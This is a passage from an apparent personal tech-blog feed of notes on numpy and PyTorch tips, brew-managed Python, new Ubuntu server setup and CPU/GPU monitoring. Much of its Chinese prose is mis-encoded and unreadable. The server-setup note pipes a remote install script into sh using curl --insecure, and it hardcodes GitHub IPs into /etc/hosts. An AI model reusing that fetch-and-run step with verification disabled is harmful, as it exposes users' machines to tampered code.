class="number">0</span>, p, size=pad_width[<span class="number">0</span>])</span><br><span class="line">            vec[vec.size-pad_width[<span class="number">1</span>]:] = np.random.randint(<span class="number">0</span>,p, size=pad_width[<span class="number">1</span>])</span><br><span class="line">            np.pad(img, (<span class="number">0</span>,<span class="number">1</span>), mode=random_pad) <span class="comment"># add 1 additional row in axis-0</span></span><br></pre></td></tr></table></figure><p>pytorch ä¸­çš„ torch.repeat()å‡½æ•°ä¸ numpy.tile() åŠŸèƒ½ç›¸ä¼¼</p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>brew ç®¡ç† python</title>
      <link href="/blog/2022/06/15/programming/python/configurations/brew_python/"/>
      <url>/blog/2022/06/15/programming/python/configurations/brew_python/</url>
      
        <content type="html"><![CDATA[<h1 id="brew-ç®¡ç†-python">brew ç®¡ç† python</h1><h2 id="å¤šç‰ˆæœ¬å…±å­˜">å¤šç‰ˆæœ¬å…±å­˜</h2><p>brew unlink python@3.8 brew link python@3.7</p><p>ç„¶åï¼Œæ ¹æ®æç¤º export åˆ° zshrc ç¯å¢ƒå˜é‡</p><h2 id="å®Œå…¨å¸è½½-python-åŒ…ä¸ä¾èµ–">å®Œå…¨å¸è½½ python åŒ…ä¸ä¾èµ–</h2><p><ahref="https://apple.stackexchange.com/questions/273774/my-mac-has-python3-and-2-7-installed-how-do-i-uninstall-python3-but-keep-2-7">MyMac has Python3 and 2.7 installed. How do I uninstall Python3 but keep2.7?</a></p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Pytorch ä½¿ç”¨çŸ¥è¯†ç‚¹</title>
      <link href="/blog/2022/06/15/programming/python/pytorch/torch_skills/"/>
      <url>/blog/2022/06/15/programming/python/pytorch/torch_skills/</url>
      
        <content type="html"><![CDATA[<p>PyTorch tensors are mutable, which means that they can be modified inplace. tensor æ˜¯ mutable objectï¼Œå’Œ listä¸€æ ·ï¼Œå› æ­¤åœ¨å‡½æ•°ä¼ å‚åï¼Œåœ¨å‡½æ•°é‡Œé¢æ—¶ï¼Œéœ€è¦æ³¨æ„æ˜¯ä¿®æ”¹åŸæ¥çš„tensorï¼Œè¿˜æ˜¯è¿”å›æ–°çš„ã€‚</p><ol type="1"><li><p>Varible and tensor: Varible æ˜¯æ—§ç‰ˆçš„ torch çš„å˜é‡, ç­‰ä»·äºtensor</p></li><li><p><code>b = a if torch.is_tensor(a) else torch.tensor(a)</code></p></li><li><p>Pytorch ä¸ numpy çš„ Tensor ä¸ arrary ç±»å‹è½¬æ¢</p><p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">torch.from_numpy(a_array)</span><br><span class="line">a_tenosr.numpy()</span><br></pre></td></tr></table></figure></p></li><li><p>numpy ä¸ torch çš„æµ®ç‚¹æ•°é»˜è®¤ä½æ•°ä¸åŒ</p><p>numpy æµ®ç‚¹æ•°é»˜è®¤ä½¿ç”¨ 64 ä½ï¼Œ torch çš„æµ®ç‚¹æ•°é»˜è®¤ä½¿ç”¨ 32 ä½</p><p>Default dtype:</p><ol type="1"><li><p>PyTorch torch.float32<code>torch.set_default_dtype(torch.float64)</code> to compatible withtensor.numpy() defauly np.float64</p></li><li><p>numpy <code>np.float64</code> <code>int_</code>: Default integertype (same as C long; normally either int64 or int32)</p></li></ol></li><li><p>shuffle tensor</p><p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">indexes = torch.randperm(data.shape[0])</span><br><span class="line">data = data[indexes]</span><br></pre></td></tr></table></figure></p><p><ahref="https://stackoverflow.com/questions/61744621/randomly-shuffling-torch-tensor">shuffle- Randomly shuffling torch tensor - Stack Overflow</a></p></li><li><p>random tensor</p><p>torch.tensor é»˜è®¤åˆå§‹åŒ–ç±»å‹ torch.float/torch.FloatTensor: floatç±»å‹, åè€…æ˜¯ CPU float ç±»å‹</p><p><code>torch.float(*(a, b, c)).uniform_(0, 100)</code></p></li><li><p>is å’Œ ==</p><p>identity operator (is) and the equality operator (==)</p><p>is æ˜¯ç”¨æ¥æ£€æŸ¥æ˜¯å¦æ˜¯ä¸€ä¸ªåœ°å€çš„æ•°æ®</p><p><code>is not</code> ä¸èƒ½å½“æˆ <code>!=</code> ç”¨</p><p><ahref="https://realpython.com/python-is-identity-vs-equality/">Python'!=' Is Not 'is not': Comparing Objects in Python â€“ RealPython</a></p></li><li><p>Reproducibility fix randomness</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">random.seed(<span class="number">0</span>)</span><br><span class="line">torch.manual_seed(<span class="number">0</span>)</span><br><span class="line">np.random.seed(<span class="number">0</span>)</span><br></pre></td></tr></table></figure></p><p><ahref="https://pytorch.org/docs/stable/notes/randomness.html">Reproducibilityâ€” PyTorch 1.13 documentation</a></p></li><li><p>pytorch å’Œ numpy ä¸­æœ€å¤§å’Œæœ€å°å€¼</p></li></ol><p>pytorch ä¸­ <code>torch.iinfo</code>, <code>torch.finfo</code>,<code>np.iinfo</code>, <code>np.finfo</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">In [93]: np.iinfo(np.int64)</span><br><span class="line">Out[93]: iinfo(min=-9223372036854775808, max=9223372036854775807, dtype=int64)</span><br><span class="line"></span><br><span class="line">In [94]: torch.iinfo(torch.int64)</span><br><span class="line">Out[94]: iinfo(min=-9.22337e+18, max=9.22337e+18, dtype=int64)</span><br><span class="line"></span><br><span class="line">In [95]: torch.finfo(torch.float64)</span><br><span class="line">Out[95]: finfo(resolution=1e-15, min=-1.79769e+308, max=1.79769e+308, eps=2.22045e-16, smallest_normal=2.22507e-308, tiny=2.22507e-308, dtype=float64)</span><br><span class="line"></span><br><span class="line">In [96]: np.iinfo(np.int64)</span><br><span class="line">Out[96]: iinfo(min=-9223372036854775808, max=9223372036854775807, dtype=int64)</span><br><span class="line"></span><br><span class="line">In [97]: np.iinfo(np.int64).max</span><br><span class="line">Out[97]: 9223372036854775807</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>æ–°æœåŠ¡å™¨é…ç½®</title>
      <link href="/blog/2022/05/30/linux/newserver_config/"/>
      <url>/blog/2022/05/30/linux/newserver_config/</url>
      
        <content type="html"><![CDATA[<h1 id="æ–°æœåŠ¡å™¨é…ç½®">æ–°æœåŠ¡å™¨é…ç½®</h1><ol type="1"><li><p>æŸ¥çœ‹è‡ªå·±å‘è¡Œç‰ˆä¸ç‰ˆæœ¬ <code>lsb_release -a</code></p><p>Linux å†…æ ¸ç‰ˆæœ¬ ç‰ˆæœ¬å·ç  ç¨³å®šç‰ˆæœ¬ï¼š2.4.32 å¼€å‘ç‰ˆæœ¬ï¼š2.5.19-6ä¸»ç‰ˆæœ¬å·.ç¨³å®š(ç¨³å®š)/å¼€å‘ç‰ˆæœ¬(å¥‡).å‘å¸ƒå·-patch å·</p></li><li><p>ä¿®æ”¹å¯†ç <code>sudo passwd user(user æ˜¯å¯¹åº”çš„ç”¨æˆ·å)</code></p></li><li><p>æ¢æº æ³¨æ„ï¼šåœ¨ä¸‹æ‹‰èœå•é€‰æ‹©å¯¹åº”çš„ Ubuntu ç‰ˆæœ¬ <ahref="https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/">ubuntu |é•œåƒç«™ä½¿ç”¨å¸®åŠ© | æ¸…åå¤§å­¦å¼€æºè½¯ä»¶é•œåƒç«™ | Tsinghua Open SourceMirror</a></p></li><li><p>æ›´æ–°ç³»ç»Ÿ</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get upgrade</span><br></pre></td></tr></table></figure></p></li><li><p>å®‰è£… <code>git wget curl tmux</code>ç­‰</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install vim git wget curl tmux zip</span><br></pre></td></tr></table></figure></p></li><li><p>æ”¹ host ä¾¿äºä¸Š github</p><p>ä½¿ç”¨ <code>ipaddress.com</code> è¿™ä¸ªç½‘ç«™æŸ¥æ‰¾ç›¸åº”åŸŸåçš„ IP åœ°å€ï¼Œä¿®æ”¹HOST æ–‡ä»¶ <code>sudo vim /etc/hosts</code></p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">199.232.69.194 https://github.global.ssl.fastly.net</span><br><span class="line">140.82.114.4 github.com</span><br><span class="line">140.82.114.4 gist.github.com</span><br></pre></td></tr></table></figure></p></li><li><p>é…ç½® git è¿æ¥ github</p></li></ol><blockquote><ol start="8" type="1"><li>å¦‚æœè™šæ‹Ÿæœºéœ€è¦å®‰è£… vmtool</li></ol></blockquote><pre><code>æ³¨æ„ï¼šå…ˆå®‰è£…å¥½Ubuntuè™šæ‹Ÿæœºï¼Œå†å®‰è£… vmtoolï¼Œubuntu å®‰è£…è¿‡ç¨‹ä¸­ä¼šå¯¹ iso CD-ROM è¿›è¡Œé”å®š[2020æœ€æ–°ç‰ˆVMwareå®‰è£…Ubuntu20.04æ•™ç¨‹(å·¨ç»†)ï¼ - çŸ¥ä¹](https://zhuanlan.zhihu.com/p/141033713)</code></pre><h2 id="å¸¸ç”¨å·¥å…·">å¸¸ç”¨å·¥å…·</h2><p>å®‰è£… python3, python3-pip</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install python3.9 python3-pip</span><br></pre></td></tr></table></figure><h2 id="å®‰è£…-zsh-å’Œ-oh-my-zsh">å®‰è£… zsh å’Œ oh-my-zsh</h2><p>å®‰è£… zsh: <code>sudo apt install zsh</code> ä¸‹è½½oh-my-zshï¼š<code>sh -c "$(curl --insecure -fsSL https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh)"</code></p><p>ä¿®æ”¹ä¸»é¢˜ï¼Œå¢åŠ æ’ä»¶</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim ~/.zshrc</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ä¿®æ”¹ ZSH_THEME=<span class="string">&quot;robbyrussell&quot;</span> ä¸º ZSH_THEME=<span class="string">&quot;ys&quot;</span></span></span><br><span class="line">source ~/.zshrc</span><br></pre></td></tr></table></figure><p>å®‰è£…æ’ä»¶ zsh-suggestions, zsh-syntax-highlighting</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/zsh-users/zsh-syntax-highlighting.git $&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;/plugins/zsh-syntax-highlighting</span><br><span class="line">git clone https://github.com/zsh-users/zsh-autosuggestions $&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;/plugins/zsh-autosuggestions</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ä¿®æ”¹ ~/.zshrcï¼š</span></span><br><span class="line">plugins=(git zsh-syntax-highlighting zsh-autosuggestions)</span><br><span class="line">source ~/.zshrc</span><br></pre></td></tr></table></figure><h2 id="å®‰è£…">å®‰è£…</h2><p><code>sudo apt-get install inetutils-ping net-tools</code>ä¸Šè¿°å‘½ä»¤æ˜¯å®‰è£… ping and ifconfig å·¥å…·</p><h2 id="å®‰è£…å¼€å‘ç¯å¢ƒ">å®‰è£…å¼€å‘ç¯å¢ƒ</h2><h2 id="install-nvidia-cuda-toolkit-using-apt">Installnvidia-cuda-toolkit Using apt</h2><p><code>sudo apt update</code>ï¼šUpdate apt database with apt using thefollowing command.</p><p>After updating apt database, We can install nvidia-cuda-toolkit usingapt by running the following command:</p><p><code>sudo apt -y install nvidia-cuda-toolkit</code></p><h2 id="æ˜¾å¡å¸¸è§„æµ‹è¯•">æ˜¾å¡å¸¸è§„æµ‹è¯•</h2><p><code>systemd-detect-virt -c</code></p><p>å¦‚æœè¾“å‡ºä¸º noneï¼Œåˆ™è¯´æ˜æ˜¯ç‰©ç†æœºã€‚</p><p><a href="http://www.njtst.com/allnews/shownews.php?id=6">æ˜¾å¡å¸¸è§„æ£€æµ‹GPUBURN gpu-burn æµ‹è¯•æ˜¾å¡æ­¥éª¤</a></p><h2 id="install-miniconda">install miniconda</h2><pre><code><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wget https://repo.anaconda.com/miniconda/Miniconda3-latest-Linux-x86_64.sh</span><br><span class="line">bash Miniconda3-latest-Linux-x86_64.sh</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ä¹‹åè®¤çœŸçœ‹æ¯ä¸€æ­¥éª¤å’Œåé¢è¾“å‡ºçš„ï¼Œä¼šæ•™ä½ å¦‚ä½•åœ¨shellä¸­æ¿€æ´»conda</span></span><br><span class="line">export PATH=/home/your_user_name/miniconda/bin:$PATH #ä¸´æ—¶æ¿€æ´»</span><br><span class="line">conda config --set auto_activate_base false</span><br><span class="line">conda init zsh # å°†æ¿€æ´»å†™å…¥shellçš„é…ç½®æ–‡ä»¶</span><br></pre></td></tr></table></figure>To initialize your shell, run `conda init &lt;SHELL_NAME&gt;`Currently supported shells are:- bash- fish- tcsh- xonsh- zsh- powershell</code></pre><h2 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h2><p><ahref="https://docs.conda.io/projects/conda/en/latest/user-guide/install/linux.html">Installingon Linux â€” conda 4.13.0.post1+0adcd595 documentation</a> <ahref="https://astrobiomike.github.io/unix/conda-intro">An introductionto Conda</a></p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu æŸ¥çœ‹ CPU å’Œ GPU</title>
      <link href="/blog/2022/05/30/linux/cpu_gpu/"/>
      <url>/blog/2022/05/30/linux/cpu_gpu/</url>
      
        <content type="html"><![CDATA[<h2 id="gpu">GPU</h2><blockquote><p>GPU å ç”¨ç‡é«˜å¥½ï¼ŒCPU å ç”¨ç‡é«˜ä¸å¥½ CPUæ˜¯å¤šä»»åŠ¡ç¯å¢ƒåº”ç”¨ï¼ˆè¦è·‘ç³»ç»Ÿï¼Œè¦è·‘ç¨‹åºï¼ŒèƒŒæ™¯å¯èƒ½è¿˜è¦æœ‰å…¶ä»–ä»»åŠ¡ï¼Œè¯»ç›˜ï¼Œåˆ†é…èµ„æºç­‰ï¼‰ï¼›GPUæ˜¯å•ä»»åŠ¡ç¯å¢ƒåº”ç”¨ï¼Œåªæœ‰å›¾å½¢è®¡ç®—ä¸€ä¸ªå·¥ä½œï¼ˆå¯¹ç”¨æˆ·æ¥è¯´ï¼Œä¸€æ¬¡è¿è¡Œä¸€ä¸ªæ¸¸æˆæˆ–è€…ä¸€ä¸ªdl è®­ç»ƒä»»åŠ¡ï¼‰ï¼Œä¸”å¸§æ•°æ˜¯æ²¡æœ‰ä¸Šé™çš„ï¼Œå¸§ç‡è¶Šé«˜ä½“éªŒè¶Šå¥½ã€‚æ‰€ä»¥ CPUå ç”¨è¶Šä½è¶Šå¯ä»¥ç»™å…¶ä»–ä»»åŠ¡ç•™å‡ºæ€§èƒ½å†—ä½™ï¼Œä¿è¯æ•´ä½“ååº”é€Ÿåº¦å’Œæµç•…æ€§ã€‚GPUåˆ©ç”¨ç‡è¶Šé«˜æ•ˆç‡è¶Šé«˜ï¼Œè®©å®ƒå°½é‡ä¸€ç›´å¹²æ´»</p></blockquote><ol type="1"><li><p>æŸ¥çœ‹ GPU å ç”¨ï¼š<code>nvidia-smi</code></p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">root@e232f:/home/# nvidia-smi</span><br><span class="line">Mon May 30 02:45:53 2022</span><br><span class="line">+-----------------------------------------------------------------------------+</span><br><span class="line">| NVIDIA-SMI 510.68.02    Driver Version: 510.68.02    CUDA Version: 11.6     |</span><br><span class="line">|-------------------------------+----------------------+----------------------+</span><br><span class="line">| GPU  Name        Persistence-M| Bus-Id        Disp.A | Volatile Uncorr. ECC |</span><br><span class="line">| Fan  Temp  Perf  Pwr:Usage/Cap|         Memory-Usage | GPU-Util  Compute M. |</span><br><span class="line">|                               |                      |               MIG M. |</span><br><span class="line">|===============================+======================+======================|</span><br><span class="line">|   0  NVIDIA GeForce ...  Off  | 00000000:3B:00.0 Off |                  N/A |</span><br><span class="line">|  0%   30C    P8    21W / 350W |   2189MiB / 12288MiB |      0%      Default |</span><br><span class="line">|                               |                      |                  N/A |</span><br><span class="line">+-------------------------------+----------------------+----------------------+</span><br><span class="line">|   1  NVIDIA GeForce ...  Off  | 00000000:AF:00.0 Off |                  N/A |</span><br><span class="line">| 30%   26C    P8    17W / 350W |   2195MiB / 24576MiB |      0%      Default |</span><br><span class="line">|                               |                      |                  N/A |</span><br><span class="line">+-------------------------------+----------------------+----------------------+</span><br><span class="line"></span><br><span class="line">+-----------------------------------------------------------------------------+</span><br><span class="line">| Processes:                                                                  |</span><br><span class="line">|  GPU   GI   CI        PID   Type   Process name                  GPU Memory |</span><br><span class="line">|        ID   ID                                                   Usage      |</span><br><span class="line">|=============================================================================|</span><br><span class="line">+-----------------------------------------------------------------------------+</span><br></pre></td></tr></table></figure></p><p>ç¬¬ä¸€è¡Œï¼šNVIDIA-SMI ç‰ˆæœ¬ï¼Œ å·²ç»å®‰è£…çš„ NVIDIAé©±åŠ¨ç‰ˆæœ¬ï¼Œå·²å®‰è£…é©±åŠ¨å¯ä»¥æ”¯æŒçš„æœ€æ–°çš„ CUDA ç‰ˆæœ¬ï¼Œæ–°çš„é©±åŠ¨å¯ä»¥æ”¯æŒæ—§ç‰ˆæœ¬çš„CUDAã€‚ <strong>æ³¨ï¼šè¿™é‡Œå¹¶ä¸èƒ½è¯´æ˜¯å¦å®‰è£…äº† CUDA</strong> <imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20220530104903.png"alt="20220530104903" /> GPU: GPU index fan: Fan speed (0%-100%), N/Ameans no fan</p></li><li><p>æŸ¥çœ‹ GPU ç¼–å·ï¼š<code>nvidia-smi -L</code></p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@e2a435:/home/# nvidia-smi -L</span><br><span class="line">GPU 0: NVIDIA GeForce RTX 3080 Ti (UUID: GPU-42432a6b-5820-e116-181b-cfd5c9c2d35e)</span><br><span class="line">GPU 1: NVIDIA GeForce RTX 3090 (UUID: GPU-9c3bdbff-5619-1d07-579d-e5892c950959)</span><br></pre></td></tr></table></figure></p></li><li><p>ç»“åˆ watch åˆ·æ–°</p><p><code>watch -n 60 -d nvidia-smi</code> <code>-n</code>:æŒ‡å®šåˆ·æ–°ç§’æ•°ï¼Œ<code>-d</code>: é«˜äº®å˜åŒ–çš„åœ°æ–¹</p></li></ol><h2 id="cpu">CPU</h2><h3 id="lscpu-æŸ¥çœ‹-cpu-ä¿¡æ¯">lscpu æŸ¥çœ‹ CPU ä¿¡æ¯</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">lscpu</span></span><br><span class="line">Architecture: x86_64</span><br><span class="line">CPU op-mode(s): 32-bit, 64-bit</span><br><span class="line">Byte Order: Little Endian</span><br><span class="line">Address sizes: 46 bits physical, 48 bits virtual</span><br><span class="line">CPU(s): 96</span><br><span class="line">On-line CPU(s) list: 0-95</span><br><span class="line">Thread(s) per core: 2</span><br><span class="line">Core(s) per socket: 24</span><br><span class="line">Socket(s): 2</span><br><span class="line">NUMA node(s): 2</span><br><span class="line">Vendor ID: GenuineIntel</span><br><span class="line">CPU family: 6</span><br><span class="line">Model: 85</span><br><span class="line">Model name: Intel(R) Xeon(R) Platinum 8259CL CPU @ 2.50GHz</span><br><span class="line">Stepping: 7</span><br><span class="line">CPU MHz: 1200.147</span><br><span class="line">CPU max MHz: 3500.0000</span><br><span class="line">CPU min MHz: 1200.0000</span><br><span class="line">BogoMIPS: 5000.00</span><br><span class="line">Virtualization: VT-x</span><br><span class="line">L1d cache: 1.5 MiB</span><br><span class="line">L1i cache: 1.5 MiB</span><br><span class="line">L2 cache: 48 MiB</span><br><span class="line">L3 cache: 71.5 MiB</span><br><span class="line">NUMA node0 CPU(s): 0-23,48-71</span><br><span class="line">NUMA node1 CPU(s): 24-47,72-95</span><br></pre></td></tr></table></figure><p>â€œCPU(s): 96â€ represents the number of logical cores, which equalsâ€œThread(s) per coreâ€ Ã— â€œCore(s) per socketâ€ Ã— â€œSocket(s)â€. One socket isone physical CPU package (which occupies one socket on the motherboard);each socket hosts a number of physical cores, and each core can run oneor more threads.</p><p>In my case, I have two sockets, each containing a 24-core Xeon 8259CLCPU, and since that supports hyper-threading with two threads, each corecan run two threads.</p><p>æ€»æ ¸æ•° = ç‰©ç† CPU ä¸ªæ•° X æ¯é¢—ç‰©ç† CPU çš„æ ¸æ•° æ€»é€»è¾‘ CPU æ•° = ç‰©ç† CPUä¸ªæ•° X æ¯ä¸ªç‰©ç† CPU çš„æ ¸æ•° X è¶…çº¿ç¨‹æ•° æŸ¥çœ‹ç‰©ç† CPU ä¸ªæ•°:<code>cat /proc/cpuinfo| grep "physical id"| sort| uniq| wc -l</code></p><p>æŸ¥çœ‹æ¯ä¸ªç‰©ç† CPU ä¸­ core çš„ä¸ªæ•°(å³æ ¸æ•°):<code>cat /proc/cpuinfo| grep "cpu cores"| uniq</code></p><p>æŸ¥çœ‹é€»è¾‘ CPU çš„ä¸ªæ•°:<code>cat /proc/cpuinfo| grep "processor"| wc -l</code></p><p>æŸ¥çœ‹ CPU å‹å·:<code>cat /proc/cpuinfo | grep name | cut -f2 -d: | uniq -c</code></p><h3 id="htop-æŸ¥çœ‹è¿›ç¨‹çš„-cpu-ä½¿ç”¨ä¿¡æ¯">htop æŸ¥çœ‹è¿›ç¨‹çš„ CPU ä½¿ç”¨ä¿¡æ¯</h3><p>htop ä¸»è¦æœ‰ä¸‰éƒ¨åˆ†ï¼š</p><ol type="1"><li><p>Headerï¼šä¸»è¦åŒ…æ‹¬ CPU, Memory, Swap å ç”¨å’Œ tasks, load average,Up-Time</p><p>Color coding for CPU</p><ul><li>Green â€“ Amount of CPU consumed by the userâ€™s processes.</li><li>Red â€“ Amount of CPU used by system processes.</li><li>Grey â€“ Amount of CPU used for Input/Output based processes.</li></ul><p>tasks: å½“å‰ä»»åŠ¡/è¿›ç¨‹æ•°ï¼›çº¿ç¨‹æ•°ï¼›å½“å‰ä»»åŠ¡ä¸­å¤„äºè¿è¡ŒçŠ¶æ€çš„ä»»åŠ¡æ•°</p><p>load averageï¼šload average åé¢çš„ä¸‰ä¸ªæ•°åˆ†åˆ«æ˜¯ 1 åˆ†é’Ÿã€5 åˆ†é’Ÿã€15åˆ†é’Ÿçš„å¹³å‡è´Ÿè½½æƒ…å†µã€‚</p><p>Uptime â€“ Amount of time since the last systemreboot.<code>uptime</code> å‘½ä»¤ä¹Ÿå¯ä»¥æŸ¥çœ‹</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">uptime</span></span></span><br><span class="line">12:17:58 up 111 days, 31 min,  1 user,  load average: 0.00, 0.01, 0.05</span><br></pre></td></tr></table></figure></p></li><li><p>æŒ‰ç…§ CPU åˆ©ç”¨ç‡æ’åºçš„è¿›ç¨‹åˆ—è¡¨</p></li><li><p>ç›¸å…³å¿«æ·é”®å‘½ä»¤ æŒ‰ <code>q</code>:é€€å‡º æŒ‰ <code>t</code>ï¼šä»¥è¿›ç¨‹æ ‘ tree å½¢å¼æ˜¾ç¤ºè¿›ç¨‹ä¿¡æ¯ <imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20220530085522.png"alt="htop_server" /></p></li></ol><p>CPU åˆ©ç”¨ç‡è¶…è¿‡ 100%çš„ç°è±¡ï¼štop/htop å‘½ä»¤æ˜¯æŒ‰ CPU æ€»ä½¿ç”¨ç‡æ¥æ˜¾ç¤ºçš„ï¼Œ24æ ¸ç†è®ºä¸Šæœ€é«˜å¯è¾¾ 2400%</p><h2 id="å‚è€ƒ">å‚è€ƒ</h2><ol type="1"><li><ahref="https://www.zhihu.com/question/318781732#:~:text=%E5%90%8C%E7%90%86%EF%BC%8CGPU%E4%BD%BF%E7%94%A8%E7%8E%87,%E5%B0%BD%E5%BF%AB%E7%9A%84%E7%AE%97%E7%82%B9%E4%B8%9C%E8%A5%BF%E2%80%A6%E2%80%A6&amp;text=%E6%98%BE%E5%8D%A1%E7%9B%AE%E5%89%8D%E6%9C%80%E4%B8%BB%E8%A6%81%E7%9A%84,%E9%99%90%E5%88%B6%E6%98%BE%E5%8D%A1%E7%9A%84%E6%80%A7%E8%83%BD%E5%8F%91%E6%8C%A5%E3%80%82">ä¸ºä»€ä¹ˆæ˜¾å¡å ç”¨ç‡é«˜å°±æ˜¯å¥½ï¼ŒCPUå ç”¨é«˜å°±æ˜¯ä¸å¥½å‘¢ï¼Ÿ - çŸ¥ä¹</a></li><li><ahref="https://unix.stackexchange.com/questions/468766/understanding-output-of-lscpu">cpu- Understanding output of lscpu - Unix &amp; Linux StackExchange</a></li><li><ahref="https://www.linuxfordevices.com/tutorials/linux/htop-command-in-linux">AGuide to the htop command in Linux - LinuxForDevices</a></li><li><ahref="https://forums.developer.nvidia.com/t/nvidia-smi-output/81665">nvidia-smioutput - CUDA / CUDA Setup and Installation - NVIDIA DeveloperForums</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Docker é•œåƒ ä¸­ Cuda å®‰è£…</title>
      <link href="/blog/2022/05/29/linux/cuda_install/"/>
      <url>/blog/2022/05/29/linux/cuda_install/</url>
      
